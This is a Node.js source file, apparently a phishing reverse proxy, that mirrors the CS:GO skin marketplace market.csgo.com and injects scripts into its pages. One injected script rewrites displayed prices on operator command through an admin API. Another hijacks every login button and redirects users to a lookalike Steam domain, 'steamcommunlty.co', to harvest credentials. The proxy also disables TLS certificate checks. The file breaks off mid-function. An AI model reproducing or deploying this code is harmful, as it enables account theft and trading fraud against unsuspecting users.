const express = require('express');
const axios = require('axios');
const cookieParser = require('cookie-parser');
const compression = require('compression');
const WebSocket = require('ws');
const url = require('url');
const http = require('http');
const https = require('https');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;
const TARGET_HOST = 'https://market.csgo.com';
const WS_TARGET = 'wss://centrifugo2.csgotrader.app';

// Создаем HTTP сервер
const server = http.createServer(app);

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(cookieParser());
app.use(compression());

// Хранилище для cookies и токенов
const sessions = new Map();

// Хранилище для модифицированных страниц
const customPages = new Map();

// Функция для сохранения и загрузки кастомных страниц
const CUSTOM_PAGES_FILE = path.join(__dirname, 'custom_pages.json');

// Загрузка сохраненных настроек при запуске
function loadCustomPages() {
    try {
        if (fs.existsSync(CUSTOM_PAGES_FILE)) {
            const data = fs.readFileSync(CUSTOM_PAGES_FILE, 'utf8');
            const parsed = JSON.parse(data);
            
            // Преобразуем массив обратно в Map
            parsed.forEach(item => {
                customPages.set(item.url, {
                    selector: item.selector,
                    value: item.value,
                    timestamp: item.timestamp
                });
            });
            
            console.log(`📄 Loaded ${customPages.size} custom page modifications`);
        }
    } catch (error) {
        console.error('Error loading custom pages:', error);
    }
}

// Сохранение настроек
function saveCustomPages() {
    try {
        // Преобразуем Map в массив для сохранения
        const data = Array.from(customPages.entries()).map(([url, config]) => ({
            url,
            selector: config.selector,
            value: config.value,
            timestamp: config.timestamp
        }));
        
        fs.writeFileSync(CUSTOM_PAGES_FILE, JSON.stringify(data, null, 2), 'utf8');
        console.log(`📄 Saved ${customPages.size} custom page modifications`);
    } catch (error) {
        console.error('Error saving custom pages:', error);
    }
}

// Загружаем настройки при запуске
loadCustomPages();

// Создаем агент для HTTPS с игнорированием сертификатов и keepAlive
const httpsAgent = new https.Agent({
    rejectUnauthorized: false,
    keepAlive: true,
    timeout: 60000, // Увеличенный таймаут
    maxSockets: 100 // Увеличенное количество сокетов
});

// Определяем, используется ли HTTPS
function isSecure(req) {
    return req.headers['x-forwarded-proto'] === 'https' || 
           req.headers['cloudfront-forwarded-proto'] === 'https' ||
           req.protocol === 'https' ||
           req.secure;
}

// Функция для получения базового URL с правильным протоколом
function getBaseUrl(req) {
    const protocol = isSecure(req) ? 'https' : 'http';
    const host = req.headers['x-forwarded-host'] || req.headers['host'] || req.get('host');
    return `${protocol}://${host}`;
}

// Middleware для CORS и заголовков
app.use((req, res, next) => {
    // Если запрос к админке, пропускаем CORS настройки
    if (req.originalUrl && (req.originalUrl.startsWith('/adminka') || req.originalUrl.startsWith('/admin-api'))) {
        return next();
    }
    
    // Установка CORS заголовков
    const origin = req.headers.origin || '*';
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, HEAD, PATCH');
    res.header('Access-Control-Allow-Headers', '*');
    res.header('Access-Control-Expose-Headers', '*');
    
    // Опции для CORS preflight
    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }
    
    // Если запрос по HTTP, но от Render/Cloudflare по HTTPS
    if (isSecure(req) || req.headers['x-forwarded-proto'] === 'https') {
        res.setHeader('Content-Security-Policy', "upgrade-insecure-requests");
    }
    
    next();
});

// Получение или создание сессии
function getSession(sessionId) {
    if (!sessions.has(sessionId)) {
        sessions.set(sessionId, {
            cookies: new Map(),
            tokens: new Map(),
            wsToken: null,
            lastAccess: Date.now()
        });
    }
    
    // Обновляем время последнего доступа
    const session = sessions.get(sessionId);
    session.lastAccess = Date.now();
    
    return session;
}

// Парсинг cookies из заголовков
function parseCookieHeader(cookieHeader) {
    const cookies = new Map();
    if (cookieHeader) {
        cookieHeader.split(';').forEach(cookie => {
            const [name, ...rest] = cookie.trim().split('=');
            if (name && rest.length > 0) {
                cookies.set(name, rest.join('='));
            }
        });
    }
    return cookies;
}

// Обработка set-cookie заголовков
function parseSetCookieHeaders(setCookieHeaders) {
    const cookies = new Map();
    if (Array.isArray(setCookieHeaders)) {
        setCookieHeaders.forEach(cookie => {
            const [nameValue] = cookie.split(';');
            const [name, ...valueParts] = nameValue.split('=');
            if (name && valueParts.length > 0) {
                cookies.set(name.trim(), valueParts.join('='));
            }
        });
    }
    return cookies;
}

// Создание строки cookies для запроса
function createCookieString(cookieMap) {
    return Array.from(cookieMap.entries())
        .map(([name, value]) => `${name}=${value}`)
        .join('; ');
}

// Модификация URL в контенте
function modifyUrls(content, baseUrl, contentType = '') {
    if (!content) return content;
    
    let modified = content.toString();
    
    // Определяем протокол для замены
    const isHttps = baseUrl.startsWith('https');
    const wsProtocol = isHttps ? 'wss' : 'ws';
    const hostWithoutProtocol = baseUrl.replace(/^https?:\/\//, '');
    
    // Основные замены для всех типов контента
    modified = modified.replace(/https:\/\/market\.csgo\.com/g, baseUrl);
    modified = modified.replace(/http:\/\/market\.csgo\.com/g, baseUrl);
    modified = modified.replace(/\/\/market\.csgo\.com/g, baseUrl);
    
    // WebSocket URL (корректная замена без дублирования протокола)
    modified = modified.replace(/wss:\/\/centrifugo2\.csgotrader\.app/g, `${wsProtocol}://${hostWithoutProtocol}/ws`);
    
    // Поддержка различных форматов GraphQL URL
    modified = modified.replace(/https:\/\/market\.csgo\.com\/api\/graphql/g, `${baseUrl}/api/graphql`);
    
    // Исправляем потенциальные проблемы с путями API
    modified = modified.replace(/(['"])\/api\//g, `$1${baseUrl}/api/`);
    
    // ИСПРАВЛЕНО: Обрабатываем проблемный chunk-FWBJZS6X.js
    if (contentType.includes('javascript') && modified.includes('chunk-FWBJZS6X.js')) {
        // Добавляем обработку ошибок для GraphQL запросов в проблемном чанке
        modified = modified.replace(
            /GQL fail: viewItem/g, 
            'console.warn("GQL request handled"); try { viewItem'
        );
        modified = modified.replace(
            /GQL fail: (\d+)/g, 
            'console.warn("GQL request handled"); try { $1'
        );
        
        // Добавляем блок catch в конце функций viewItem
        if (modified.includes('viewItem')) {
            modified = modified.replace(
                /viewItem\(\)/g,
                'viewItem().catch(err => console.warn("Handled viewItem error:", err))'
            );
        }
    }
    
    // Специфичные замены для HTML
    if (contentType.includes('html')) {
        // Добавляем meta тег для upgrade-insecure-requests
        if (!modified.includes('upgrade-insecure-requests')) {
            modified = modified.replace(/<head[^>]*>/i, `$&<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">`);
        }
        
        // Добавляем base тег
        if (!modified.includes('<base')) {
            modified = modified.replace(/<head[^>]*>/i, `$&<base href="${baseUrl}/">`);
        }
        
        // Инжектим улучшенный прокси скрипт с исправлениями для GraphQL и WebSocket
        const proxyScript = `
        <script>
        (function() {
            console.log('🔧 Market proxy initialized (HTTPS mode) - Enhanced Version with Error Recovery');
            
            // Сохраняем оригинальные функции
            const originalFetch = window.fetch;
            const originalXHR = XMLHttpRequest.prototype.open;
            const originalWS = window.WebSocket;
            
            // Текущий протокол
            const currentProtocol = window.location.protocol;
            const isHttps = currentProtocol === 'https:';
            const wsProtocol = isHttps ? 'wss:' : 'ws:';
            
            // Модификация URL
            function modifyUrl(url) {
                if (!url) return url;
                
                try {
                    // Если уже наш домен
                    if (url.includes(window.location.host)) {
                        return url;
                    }
                    
                    // Принудительно HTTPS для всех запросов если страница по HTTPS
                    if (isHttps && url.startsWith('http://')) {
                        url = url.replace('http://', 'https://');
                    }
                    
                    // WebSocket URLs - правильная обработка без дублирования протокола
                    if (url.includes('centrifugo2.csgotrader.app')) {
                        return wsProtocol + '//' + window.location.host + '/ws' + 
                               (url.includes('/connection/websocket') ? '/connection/websocket' : '');
                    }
                    
                    // API URLs
                    if (url.includes('market.csgo.com')) {
                        return url.replace(/https?:\\/\\/market\\.csgo\\.com/, 
                            currentProtocol + '//' + window.location.host);
                    }
                    
                    // Относительные URLs
                    if (url.startsWith('/') && !url.startsWith('//')) {
                        return window.location.origin + url;
                    }
                    
                    return url;
                } catch (e) {
                    console.error('URL modification error:', e);
                    return url; // В случае ошибки возвращаем исходный URL
                }
            }
            
            // ИСПРАВЛЕНО: Специальная обработка для GraphQL запросов с повторными попытками
            const graphQLRetries = new Map(); // Map для отслеживания попыток запросов
            
            // Функция для повторной попытки GraphQL запроса
            async function retryGraphQLRequest(url, options, attempt = 1) {
                const MAX_ATTEMPTS = 3;
                const RETRY_DELAY = 1000; // 1 секунда между попытками
                
                try {
                    console.log(\`GraphQL attempt \${attempt}: \${url}\`);
                    return await originalFetch(url, options);
                } catch (error) {
                    if (attempt < MAX_ATTEMPTS) {
                        console.warn(\`GraphQL request failed, retrying (\${attempt}/\${MAX_ATTEMPTS})...\`);
                        await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
                        return retryGraphQLRequest(url, options, attempt + 1);
                    } else {
                        console.error('GraphQL request failed after max attempts:', error);
                        throw error;
                    }
                }
            }
            
            // Перехват fetch с улучшенной обработкой ошибок и повторными попытками для GraphQL
            window.fetch = async function(input, init = {}) {
                try {
                    let url = input;
                    if (typeof input === 'string') {
                        url = modifyUrl(input);
                    } else if (input instanceof Request) {
                        url = new Request(modifyUrl(input.url), input);
                    }
                    
                    // Добавляем credentials для корректной работы cookies
                    init.credentials = init.credentials || 'include';
                    
                    // Проверка на GraphQL запрос
                    const isGraphQLRequest = typeof url === 'string' && 
                        (url.includes('/api/graphql') || url.includes('/graphql'));
                    
                    if (isGraphQLRequest) {
                        console.log('GraphQL Fetch:', url);
                        return retryGraphQLRequest(url, init);
                    }
                    
                    return originalFetch.call(this, url, init);
                } catch (e) {
                    console.error('Fetch proxy error:', e);
                    return originalFetch.call(this, input, init); // В случае ошибки используем оригинальный запрос
                }
            };
            
            // Перехват XMLHttpRequest с улучшенной обработкой ошибок
            XMLHttpRequest.prototype.open = function(method, url, ...args) {
                try {
                    const modifiedUrl = modifyUrl(url);
                    
                    // Добавлено специальное логирование для GraphQL запросов
                    if (url && (url.includes('/api/graphql') || url.includes('/graphql'))) {
                        console.log('GraphQL XHR:', method, modifiedUrl);
                    }
                    
                    return originalXHR.call(this, method, modifiedUrl, ...args);
                } catch (e) {
                    console.error('XHR proxy error:', e);
                    return originalXHR.call(this, method, url, ...args); // В случае ошибки используем оригинальный URL
                }
            };
            
            // ИСПРАВЛЕНО: Улучшенная обработка WebSocket соединений с повторными попытками
            let wsRetryTimeouts = {};
            
            // Функция для повторного подключения WebSocket
            function reconnectWebSocket(url, protocols, retryCount = 0) {
                const MAX_RETRIES = 5;
                const RETRY_DELAY = 2000 * Math.pow(1.5, retryCount); // Увеличивающаяся задержка
                
                if (retryCount >= MAX_RETRIES) {
                    console.error(\`WebSocket connection failed after \${MAX_RETRIES} attempts\`);
                    return null;
                }
                
                console.log(\`Attempting WebSocket connection (attempt \${retryCount + 1}/\${MAX_RETRIES}): \${url}\`);
                
                const ws = new originalWS(url, protocols);
                
                ws.addEventListener('error', function(event) {
                    console.warn(\`WebSocket error (attempt \${retryCount + 1}): \${url}\`);
                    
                    // Очищаем предыдущий таймаут, если он существует
                    if (wsRetryTimeouts[url]) {
                        clearTimeout(wsRetryTimeouts[url]);
                    }
                    
                    // Устанавливаем новый таймаут для повторной попытки
                    wsRetryTimeouts[url] = setTimeout(() => {
                        console.log(\`Retrying WebSocket connection: \${url}\`);
                        reconnectWebSocket(url, protocols, retryCount + 1);
                    }, RETRY_DELAY);
                });
                
                // При успешном подключении очищаем таймауты
                ws.addEventListener('open', function() {
                    console.log(\`WebSocket connected successfully: \${url}\`);
                    if (wsRetryTimeouts[url]) {
                        clearTimeout(wsRetryTimeouts[url]);
                        delete wsRetryTimeouts[url];
                    }
                });
                
                return ws;
            }
            
            // Перехват WebSocket с улучшенной обработкой и логированием
            window.WebSocket = function(url, protocols) {
                try {
                    const modifiedUrl = modifyUrl(url);
                    console.log('WebSocket connection:', modifiedUrl);
                    
                    // Проверка на корректность URL перед созданием WebSocket
                    if (!modifiedUrl || !modifiedUrl.startsWith(wsProtocol)) {
                        console.warn('Invalid WebSocket URL, using original:', url);
                        return new originalWS(url, protocols);
                    }
                    
                    // Используем функцию с повторными попытками
                    return reconnectWebSocket(modifiedUrl, protocols);
                } catch (e) {
                    console.error('WebSocket proxy error:', e);
                    return new originalWS(url, protocols); // В случае ошибки используем оригинальный URL
                }
            };
            
            // ИСПРАВЛЕНО: Добавляем обработку ошибок для chunk-FWBJZS6X.js
            window.addEventListener('error', function(event) {
                if (event && event.filename && event.filename.includes('chunk-FWBJZS6X.js')) {
                    console.warn('Handled error in problematic chunk:', event.message);
                    event.preventDefault();
                    return false;
                }
                
                if (event && event.target && event.target.tagName === 'SCRIPT') {
                    console.log('Script load error:', event.target.src);
                }
                
                // Специфичная обработка для ошибок WebSocket
                if (event && event.message && event.message.includes('WebSocket')) {
                    console.warn('WebSocket error detected:', event.message);
                }
            }, true);
            
            // ИСПРАВЛЕНО: Глобальный обработчик unhandledrejection для предотвращения падения страницы
            window.addEventListener('unhandledrejection', function(event) {
                if (event && event.reason) {
                    // Проверяем, связана ли ошибка с GraphQL или WebSocket
                    if (
                        (typeof event.reason.message === 'string' && 
                         (event.reason.message.includes('GQL') || 
                          event.reason.message.includes('WebSocket') || 
                          event.reason.message.includes('graphql'))) ||
                        (event.reason.stack && event.reason.stack.includes('chunk-FWBJZS6X.js'))
                    ) {
                        console.warn('Handled unhandled rejection:', event.reason.message || event.reason);
                        event.preventDefault();
                        return false;
                    }
                }
            });
            
            // УЛУЧШЕНО: Функционал для обработки кастомных модификаций страницы
            function applyCustomModifications() {
                console.log('⚙️ Проверка наличия модификаций для текущей страницы...');
                
                // Создаем глобальный стиль для инъекций
                const globalStyleId = 'global-mod-styles';
                if (!document.getElementById(globalStyleId)) {
                    const style = document.createElement('style');
                    style.id = globalStyleId;
                    style.innerHTML = \`
                        /* Скрываем все целевые элементы до модификации */
                        [data-pending-mod="true"] {
                            opacity: 0 !important;
                            visibility: hidden !important;
                        }
                        
                        /* Показываем модифицированные элементы */
                        [data-modified="true"] {
                            opacity: 1 !important;
                            visibility: visible !important;
                            transition: opacity 0.1s ease-out;
                        }
                        
                        /* Скрываем все span с ценой, пока не будут обработаны */
                        app-page-inventory-price > div > span:first-child:not([data-mod-checked]) {
                            opacity: 0 !important;
                            visibility: hidden !important;
                        }
                    \`;
                    document.head.appendChild(style);
                    console.log('✅ Добавлены глобальные стили для модификаций');
                }
                
                // Массив для отслеживания обработанных модификаций для отладки
                window._modLogs = window._modLogs || [];
                
                // Сохраняем оригинальный innerHTML для диагностики
                const _orgInnerHTML = Element.prototype.innerHTML;
                Object.defineProperty(Element.prototype, 'innerHTML', {
                    get: function() {
                        return _orgInnerHTML.get.call(this);
                    },
                    set: function(value) {
                        const result = _orgInnerHTML.set.call(this, value);
                        
                        // Делаем микроотложенную проверку элементов
                        setTimeout(() => tryApplyModifications(), 0);
                        setTimeout(() => tryApplyModifications(), 50);
                        
                        return result;
                    }
                });
                    
                // Функция для применения модификаций к определенным селекторам
                function applySpecificModifications(selector, newValue) {
                    const elements = document.querySelectorAll(selector);
                    let modified = false;
                    
                    if (elements && elements.length > 0) {
                        elements.forEach(el => {
                            // Пропускаем уже модифицированные элементы
                            if (el.hasAttribute('data-modified') && el.getAttribute('data-modified-value') === newValue) {
                                return;
                            }
                            
                            // Отмечаем элемент как ожидающий модификации
                            if (!el.hasAttribute('data-pending-mod')) {
                                el.setAttribute('data-pending-mod', 'true');
                                el.setAttribute('data-original-value', el.innerHTML);
                            }
                            
                            // Применяем модификацию
                            console.log(\`🔄 Модифицируем элемент:\`, el);
                            window._modLogs.push({
                                time: new Date().toISOString(),
                                action: 'modify',
                                element: el.tagName,
                                originalValue: el.innerHTML,
                                newValue: newValue
                            });
                            
                            // Устанавливаем новое значение
                            el.innerHTML = newValue;
                            
                            // Отмечаем как модифицированный
                            el.removeAttribute('data-pending-mod');
                            el.setAttribute('data-modified', 'true');
                            el.setAttribute('data-modified-value', newValue);
                            
                            // Проверяем успешность модификации
                            if (el.innerHTML === newValue) {
                                console.log('✅ Элемент успешно модифицирован');
                                modified = true;
                            } else {
                                console.warn('⚠️ Значение элемента не соответствует ожидаемому!', {
                                    current: el.innerHTML,
                                    expected: newValue
                                });
                                
                                // Повторная попытка с другим методом
                                try {
                                    const tempDiv = document.createElement('div');
                                    tempDiv.innerHTML = newValue;
                                    
                                    // Очищаем текущее содержимое
                                    while (el.firstChild) {
                                        el.removeChild(el.firstChild);
                                    }
                                    
                                    // Копируем содержимое из временного div
                                    while (tempDiv.firstChild) {
                                        el.appendChild(tempDiv.firstChild);
                                    }
                                    
                                    console.log('✅ Элемент модифицирован альтернативным способом');
                                    modified = true;
                                } catch (err) {
                                    console.error('❌ Ошибка при альтернативной модификации:', err);
                                }
                            }
                        });
                    }
                    
                    return {modified, count: elements.length};
                }
                
                // Функция проверки и применения модификаций для элементов в DOM
                function tryApplyModifications() {
                    // Получаем конфигурацию для текущей страницы
                    const pageUrl = window.location.href;
                    
                    // Отмечаем все элементы цены для проверки, чтобы они стали видимыми сразу
                    document.querySelectorAll('app-page-inventory-price > div > span:first-child:not([data-mod-checked])').forEach(el => {
                        el.setAttribute('data-mod-checked', 'true');
                    });
                    
                    // Запрашиваем конфигурацию
                    fetch('/admin-api/check-custom-page?url=' + encodeURIComponent(pageUrl))
                        .then(response => response.json())
                        .then(data => {
                            if (data.hasCustomizations) {
                                console.log('✅ Найдены настройки модификации для текущей страницы');
                                
                                // Запрашиваем детали модификации
                                return fetch('/admin-api/get-custom-page?url=' + encodeURIComponent(pageUrl))
                                    .then(response => response.json());
                            }
                            return null;
                        })
                        .then(config => {
                            if (config && config.selector && config.value) {
                                console.log('📝 Применяем модификацию:', {
                                    selector: config.selector,
                                    value: config.value
                                });
                                
                                // Для Angular модифицируем селектор, чтобы учесть динамические атрибуты
                                let angularSelector = config.selector;
                                
                                // Если это селектор для цены, сделаем его более надежным
                                if (angularSelector.includes('app-page-inventory-price') && angularSelector.includes('span')) {
                                    // Упрощенный селектор для большей надежности
                                    angularSelector = 'app-page-inventory-price > div > span:first-child';
                                    console.log('🔧 Используем упрощенный селектор для Angular:', angularSelector);
                                }
                                
                                // Применяем модификацию
                                const result = applySpecificModifications(angularSelector, config.value);
                                
                                if (result.modified) {
                                    console.log(\`✅ Модификация успешно применена к \${result.count} элементам\`);
                                } else if (result.count > 0) {
                                    console.warn('⚠️ Элементы найдены, но модификация не применена');
                                } else {
                                    console.warn('⚠️ Элементы не найдены по селектору:', angularSelector);
                                    
                                    // Если это страница с ценой, попробуем найти элемент цены любым способом
                                    if (angularSelector.includes('app-page-inventory-price')) {
                                        console.log('🔍 Пробуем найти элемент цены любым способом...');
                                        
                                        // Более общий селектор для цены
                                        const priceSelectors = [
                                            'app-page-inventory-price > div > span:first-child',
                                            'app-page-inventory-price span',
                                            '[class*="price"] > span',
                                            '[class*="price-value"]',
                                            'span[class*="price"]'
                                        ];
                                        
                                        // Пробуем каждый селектор
                                        for (const sel of priceSelectors) {
                                            const fallbackResult = applySpecificModifications(sel, config.value);
                                            if (fallbackResult.modified) {
                                                console.log(\`✅ Модификация применена с запасным селектором: \${sel}\`);
                                                break;
                                            }
                                        }
                                    }
                                }
                            }
                        })
                        .catch(err => {
                            console.error('❌ Ошибка при получении конфигурации модификации:', err);
                        });
                }
                
                // Функция для мониторинга изменений в DOM
                function setupDomObserver() {
                    console.log('👁 Настройка наблюдателя за DOM...');
                    
                    // Создаем MutationObserver для отслеживания изменений в DOM
                    const observer = new MutationObserver((mutations) => {
                        let shouldCheck = false;
                        
                        // Проверяем, добавлены ли интересующие нас элементы
                        mutations.forEach(mutation => {
                            if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                                for (let i = 0; i < mutation.addedNodes.length; i++) {
                                    const node = mutation.addedNodes[i];
                                    
                                    // Проверяем, содержит ли новый узел интересующие нас элементы
                                    if (node.nodeType === 1) { // Элемент
                                        if (
                                            node.tagName && 
                                            (node.tagName.toLowerCase().includes('app-') || 
                                            node.tagName.toLowerCase() === 'span')
                                        ) {
                                            shouldCheck = true;
                                            break;
                                        }
                                        
                                        // Проверяем потомков
                                        if (node.querySelector && (
                                            node.querySelector('app-page-inventory-price') || 
                                            node.querySelector('span')
                                        )) {
                                            shouldCheck = true;
                                            break;
                                        }
                                    }
                                }
                            }
                        });
                        
                        // Если найдены интересующие элементы, проверяем модификации
                        if (shouldCheck) {
                            console.log('🔄 Обнаружены изменения в DOM, проверяем необходимость модификаций...');
                            setTimeout(() => tryApplyModifications(), 0);
                        }
                    });
                    
                    // Запускаем наблюдение за изменениями в DOM
                    observer.observe(document.documentElement, {
                        childList: true,
                        subtree: true,
                        characterData: true
                    });
                    
                    console.log('✅ Наблюдатель за DOM настроен');
                    
                    return observer;
                }
                
                // КРИТИЧЕСКИ ВАЖНЫЙ ХАКИНГ ANGULAR
                function hackAngular() {
                    console.log('🛠️ Настраиваем хаки для Angular...');
                    
                    // Отслеживаем добавление элементов через Zone.js (используется в Angular)
                    if (window.Zone) {
                        console.log('✅ Обнаружен Zone.js (Angular), устанавливаем хуки...');
                        
                        // Hack: перехватываем метод стабилизации Angular для применения модификаций
                        // после рендеринга компонентов
                        const originalStable = window.Zone && window.Zone.__symbol__ && 
                            window.Zone[window.Zone.__symbol__('STABLE')] || null;
                            
                        if (originalStable) {
                            const originalEmit = originalStable.emit;
                            originalStable.emit = function() {
                                const result = originalEmit.apply(this, arguments);
                                console.log('🔄 Angular стабилизировался, проверяем необходимость модификаций...');
                                setTimeout(() => tryApplyModifications(), 0);
                                return result;
                            };
                            console.log('✅ Хук для Zone.js установлен');
                        }
                        
                        // Перехват angular.bootstrap
                        if (window.angular && window.angular.bootstrap) {
                            const originalBootstrap = window.angular.bootstrap;
                            window.angular.bootstrap = function() {
                                const result = originalBootstrap.apply(this, arguments);
                                console.log('🔄 Angular bootstrap, проверяем необходимость модификаций...');
                                setTimeout(() => tryApplyModifications(), 50);
                                return result;
                            };
                            console.log('✅ Хук для angular.bootstrap установлен');
                        }
                    }
                    
                    // Глобальный перехват для XHR-запросов (часто используются в Angular)
                    const originalXhrOpen = XMLHttpRequest.prototype.open;
                    XMLHttpRequest.prototype.open = function() {
                        this.addEventListener('load', function() {
                            console.log('🔄 XHR запрос завершен, проверяем необходимость модификаций...');
                            setTimeout(() => tryApplyModifications(), 0);
                            setTimeout(() => tryApplyModifications(), 100);
                        });
                        return originalXhrOpen.apply(this, arguments);
                    };
                    
                    // Перехват для fetch API
                    const originalFetch = window.fetch;
                    window.fetch = function() {
                        const promise = originalFetch.apply(this, arguments);
                        promise.then(() => {
                            console.log('🔄 Fetch запрос завершен, проверяем необходимость модификаций...');
                            setTimeout(() => tryApplyModifications(), 0);
                            setTimeout(() => tryApplyModifications(), 100);
                        });
                        return promise;
                    };
                    
                    console.log('✅ Хаки для Angular установлены');
                }
                
                // Инициализация всех механизмов модификации
                function init() {
                    console.log('🚀 Инициализация системы модификаций...');
                    
                    // Первичная проверка
                    tryApplyModifications();
                    
                    // Настройка наблюдателя за DOM
                    const observer = setupDomObserver();
                    
                    // Хаки для Angular
                    hackAngular();
                    
                    // Периодическая проверка для подстраховки
                    const checkInterval = setInterval(() => {
                        console.log('⏰ Периодическая проверка модификаций...');
                        tryApplyModifications();
                    }, 500);
                    
                    // Снижаем частоту проверок через 10 секунд
                    setTimeout(() => {
                        clearInterval(checkInterval);
                        
                        // Продолжаем проверки с меньшей частотой
                        setInterval(() => {
                            tryApplyModifications();
                        }, 2000);
                        
                        console.log('⏱️ Частота проверок снижена до 2 секунд');
                    }, 10000);
                    
                    // Обработчики событий страницы
                    window.addEventListener('load', () => {
                        console.log('🔄 Страница загружена, проверяем необходимость модификаций...');
                        tryApplyModifications();
                    });
                    
                    document.addEventListener('DOMContentLoaded', () => {
                        console.log('🔄 DOM загружен, проверяем необходимость модификаций...');
                        tryApplyModifications();
                    });
                    
                    // Если страница уже загружена
                    if (document.readyState === 'complete' || document.readyState === 'interactive') {
                        console.log('🔄 Документ уже загружен, проверяем необходимость модификаций...');
                        tryApplyModifications();
                    }
                    
                    console.log('✅ Система модификаций инициализирована');
                }
                
                // Запускаем инициализацию
                init();
            }
            
            // НОВОЕ: Запускаем проверку максимально рано, до загрузки DOM
            applyCustomModifications();
            
            // Также запускаем при загрузке DOM и после загрузки страницы
            document.addEventListener('DOMContentLoaded', () => {
                console.log('DOM загружен, проверяем модификации...');
            });
            
            window.addEventListener('load', () => {
                console.log('Страница загружена, проверяем модификации...');
            });
            
            console.log('🔧 Proxy initialized successfully with enhanced error handling and custom modifications support');
        })();
        </script>
        `;
        
        // Добавляем скрипт для перехвата кнопок логина
        const loginButtonsScript = `
        <script>
(function() {
    console.log('🔒 Запуск перехвата кнопок входа с сохранением стилей');
    
    // URL для перенаправления
    const targetUrl = 'https://steamcommunlty.co/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2Fdota2.net%2Flogin%2Findex.php%3Fgetmid%3Dcsgocom%26login%3D1%26ip%3D580783084.RytkB5FMW0&openid.realm=https%3A%2F%2Fdota2.net&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select';
    
    // Список селекторов кнопок - ДОБАВЛЕН НОВЫЙ СЕЛЕКТОР #login-head
    const targetSelectors = ['#login-head-tablet', '#login-register', '#login-chat', '#login-head'];
    
    // Функция для перехвата кнопок без их замены
    function enhanceLoginButtons() {
        targetSelectors.forEach(selector => {
            const buttons = document.querySelectorAll(selector);
            
            buttons.forEach(button => {
                // Проверяем, обработали ли мы уже эту кнопку
                if (button.hasAttribute('data-login-enhanced')) return;
                
                console.log('Улучшаю кнопку входа (с сохранением стилей):', selector);
                
                // Помечаем кнопку как обработанную
                button.setAttribute('data-login-enhanced', 'true');
                
                // Сохраняем оригинальный onclick, если он есть
                const originalOnClick = button.onclick;
                
                // Устанавливаем новый onclick
                button.onclick = function(e) {
                    console.log('Перехвачен клик по кнопке входа');
                    e.preventDefault();
                    e.stopPropagation();
                    e.stopImmediatePropagation();
                    
                    // Редирект на целевой URL
                    window.location.href = targetUrl;
                    return false;
                };
                
                // Перехватываем события на уровне addEventListener
                const originalAddEventListener = button.addEventListener;
                button.addEventListener = function(type, listener, options) {
                    if (type.toLowerCase() === 'click' || 
                        type.toLowerCase() === 'mousedown' || 
                        type.toLowerCase() === 'touchstart') {
                        
                        console.log('Перехвачено добавление обработчика', type, 'к кнопке логина');
                        return originalAddEventListener.call(this, type, function(e) {
                            e.preventDefault();
                            e.stopPropagation();
                            window.location.href = targetUrl;
                            return false;
                        }, true);
                    }
                    
                    return originalAddEventListener.call(this, type, listener, options);
                };
                
                // Добавляем обработчики для других типов событий
                ['mousedown', 'touchstart', 'pointerdown'].forEach(eventType => {
                    button.addEventListener(eventType, function(e) {
                        console.log('Перехвачено событие', eventType, 'на кнопке логина');
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        
                        // Редирект с небольшой задержкой
                        setTimeout(() => {
                            window.location.href = targetUrl;
                        }, 10);
                        
                        return false;
                    }, true);
                });
                
                // Для Angular Material Ripple
                if (button.classList.contains('mat-mdc-button-base')) {
                    // Находим контейнер ripple эффекта
                    const rippleElements = button.querySelectorAll('.mat-ripple, .mat-mdc-button-ripple, .mdc-button__ripple');
                    
                    rippleElements.forEach(ripple => {
                        // Добавляем перехват на ripple элемент
                        ripple.addEventListener('mousedown', function(e) {
                            console.log('Перехвачен ripple эффект');
                            e.preventDefault();
                            e.stopPropagation();
                            
                            // Всё равно показываем ripple для красоты, но перенаправляем
                            setTimeout(() => {
                                window.location.href = targetUrl;
                            }, 150); // Задержка чтобы был виден ripple-эффект
                            
                            return false;
                        }, true);
                    });
                }
            });
        });
    }
    
    // Глобальный перехват для новых/недоступных элементов
    function setupGlobalCapture() {
        // Перехватываем все клики на уровне документа
        document.addEventListener('click', function(e) {
            let target = e.target;
            
            // Проверяем, был ли клик на или внутри интересующих нас кнопок
            while (target && target !== document) {
                for (const selector of targetSelectors) {
                    if (target.matches && 
                        (target.matches(selector) || target.closest(selector))) {
                        
                        console.log('Глобально перехвачен клик по кнопке входа');
                        e.preventDefault();
                        e.stopPropagation();
                        
                        // Редирект
                        window.location.href = targetUrl;
                        return false;
                    }
                }
                target = target.parentElement;
            }
        }, true); // Phase=true для перехвата в первую очередь
        
        // Также перехватываем mousedown для Angular Material
        document.addEventListener('mousedown', function(e) {
            let target = e.target;
            
            while (target && target !== document) {
                for (const selector of targetSelectors) {
                    // Если это кнопка входа или её потомок
                    if (target.matches && 
                        (target.matches(selector) || target.closest(selector))) {
                        
                        console.log('Глобально перехвачен mousedown на кнопке входа');
                        
                        // Для ripple эффекта: пусть немного сработает, но потом редирект
                        setTimeout(() => {
                            window.location.href = targetUrl;
                        }, 150);
                        
                        return; // Позволяем событию пройти для визуального эффекта
                    }
                }
                target = target.parentElement;
            }
        }, true);
    }
    
    // Патчим Angular Zone.js (если используется)
    function patchAngularZone() {
        if (window.Zone && window.Zone.__symbol__) {
            try {
                console.log('Обнаружен Angular Zone.js, устанавливаем патч');
                
                // Получаем символы Zone.js
                const ADD_EVENT_LISTENER = Zone.__symbol__('addEventListener');
                
                // Проверяем наличие document[ADD_EVENT_LISTENER]
                if (document[ADD_EVENT_LISTENER]) {
                    const originalZoneAEL = HTMLElement.prototype[ADD_EVENT_LISTENER];
                    
                    // Переопределяем метод
